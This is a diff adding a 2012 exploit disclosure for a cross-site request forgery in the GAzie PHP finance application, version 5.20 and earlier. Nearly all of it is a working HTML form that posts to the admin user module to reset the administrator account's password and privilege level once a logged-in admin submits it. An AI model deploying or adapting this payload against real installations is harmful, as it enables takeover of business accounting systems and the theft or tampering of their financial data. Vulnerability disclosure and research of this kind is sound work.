@@ -1,0 +1,35 @@
+========================================
+GAzie <= 5.20 Cross Site Request Forgery
+========================================
+
+Author___: giudinvx
+Email____: <giudinvx[at]gmail[dot]com>
+Date_____: 5/02/2012
+Site_____: http://www.giudinvx.altervista.org/
+--------------------------------------------------------
+@Application Info:
+Multicompany finance application written in PHP using a MySql
+database backend for small to medium enterprise. It lets you
+write invoices, manage stock, manage orders , accounting, etc.
+Send tax receipt to electronic cash register.
+@Version 5.20http://sourceforge.net/projects/gazie/
+--------------------------------------------------------
+
+==============[[ -Exploit Code- ]]==============
+
+<form enctype="multipart/form-data"
+action="[localhost]/modules/config/admin_utente.php?Login=amministratore&Update"
+method="POST">
+<input type="hidden" name="Login" value="amministratore">
+<input type="hidden" value="" name="Update">
+<input type="text" value="Surname " name="Cognome" title="Cognome">
+<input type="text" value="Name " name="Nome" title="Nome">
+<input type="text" value="italian" name="lang">
+<input type="text" value="9" name="Abilit"><br/>
+Password
+<input type="password" value="" name="Password"><br/><!-- at least
+eight alphanumeric characters -->
+Repeat password
+<input type="password" value="" name="confpass"><br/>
+<input type="submit" value="START THE GAME" name="Submit">	
+</form>
